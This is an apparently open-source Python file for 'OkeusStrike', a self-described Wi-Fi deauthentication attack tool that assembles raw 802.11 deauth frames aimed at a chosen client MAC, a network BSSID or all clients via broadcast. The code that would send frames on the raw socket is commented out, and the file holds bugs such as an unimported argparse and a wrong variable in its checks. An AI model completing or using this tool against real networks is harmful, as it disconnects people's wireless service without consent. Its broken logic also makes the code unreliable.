#!/usr/bin/env python3

# OkeusStrike - Advanced Deauthentication Attack Tool - okeus
# Copyright (C) 2025 Richard Smith (Islc12)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.

# not all these imports are used in the final code, they are here until I determine exactly which file they will be used in
import socket  # Low-level networking with raw sockets
import okeusarguments # Parsing command-line arguments from arguments.py
import convert # MAC address conversion from convert.py
import reason # Handles reason codes
import timer # Handles time-based attack types
import framecontrol # Handles fragmentation and sequencing
import rt # Adds radio tap header 
import os
import struct  # Unpacking binary data (e.g., network headers)
import sys

def f_assem(args):
    # Parse command-line arguments
    interface = args.netinterface # handled automatically
    dest_mac = args.dest # mapped
    source_mac = args.ap_source # mapped
    network_bssid = args.net_bssid # mapped
    broadcast_attack =  args.broadcast # mapped
    frag_size = args.fragment_size # mapped
    seq_num = args.sequence # mapped
    reason_code = args.reason_code # mapped
    timedelay = args.time # mapped
    frame_flood = args.flood # mapped
    num_frames = args.count # mapped
    dur_of_attack = args.duration # mapped

    if any(arg in sys.argv for arg in ("-h", "--help")):
        parser = argparse.ArgumentParser()
        parser.print_help()
        sys.exit(0)
    if os.geteuid() != 0:
        print("ATTENTION: Script requires root privlages, please run as root")
        exit(1)
    # handle all illogical arguments
    if (broadcast_attack or timedelay or frame_flood or num_frames or
    frag_size or seq_num or reason or dur_of_attack) and not dest_mac:
        print("Error: target input required") # requires target input for most operations
        exit(1)
    if (broadcast_attack or timedelay or frame_flood or num_frames or
    frag_size or seq_num or reason or dur_of_attack) and not network_bssid:
        print("Error: network BSSID required") # requires network BSSID for most operations
        exit(1)
    if frame_flood and (num_frames or timedelay or dur_of_attack):
        print("Error: --flood requires no other arguments")
        exit(1)
    if broadcast_attack and dest_mac:
        print("Invalid arguments, too many addresses in Address 1")
        exit(1)
    if not (broadcast_attack or dest_mac):
        print("Invalid input, need address 1 field")
        exit(1)
    
    # starts the 80211 mac header, deauth frame byte
    f_ctl = struct.pack('B', 0xC0)

    # second byte makeup of FCF
    if not frag_size:
        f_frag = struct.pack('B', 0x00)
    elif frag_size:
        f_frag = struct.pack('B', 0x10)

    # Duration field
    f_dur = struct.pack('<H', 0x00)

    # Address 1 field
    if broadcast_attack:
        ct = convert.machex('FF:FF:FF:FF:FF:FF')
    elif dest_mac:
        ct = convert.machex(dest_mac)

    # Address 2 field, if not given Address 3 fills
    if not source_mac:
        src = network_bssid
    elif source_mac:
        src = convert.machex(source_mac)

    # Address 3 field
    if network_bssid:
        net = convert.machex(network_bssid)
    if not network_bssid:
        print("Invalid argument, missing Address 3")
        exit(1)

    # Sequence Control Field
    if not (frag_size and seq_num):
        seq = struct.pack('<H', 0x00)
    elif frag_size and not seq_num:
        seq = struct.pack('<H', frag_size & 0x0F)
    elif seq_num and not frag_size:
        seq = struct.pack('<H', (seq_num << 4) & 0xFFF0)
    elif (seq_num and frag_size):
        seq = struct.pack('<H', ((seq_num << 4) & 0xFFF0) | (frag_size & 0x0F))

    # Compile the frame header
    fh = f_ctl + f_frag + f_dur + ct + src + net + seq

    # Body
    if not reason_code:
        df = fh
    elif reason_code:
        rc = reason.reasoncode_input(reason_code)
        df = fh + rc

    return df

def main():
    args = okeusarguments.parse_arguments()

    timedelay = args.time # mapped
    frame_flood = args.flood # mapped
    num_frames = args.count # mapped
    dur_of_attack = args.duration # mapped

    # Open the socket
    # s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    # s.bind((interface, 0))

    # if timedelay:
    #     timer.time_delay(timedelay)
    # if frame_flood:
    #     massatk.deauthflood(frame_flood)
    # if num_frames:
    #     timer.user_frames(num_frames)
    # if dur_of_attack:
    #     timer.duration_input(dur_of_attack)

    # try:
    #     frame = rt.rthead() + df
    #     s.send(frame)
        
    # except Exception as e:
    #     print(f"Error: {e}")
    #     exit(1)
    # finally:
    #     s.close()

    df = f_assem(args)

if __name__ == "__main__":
    main()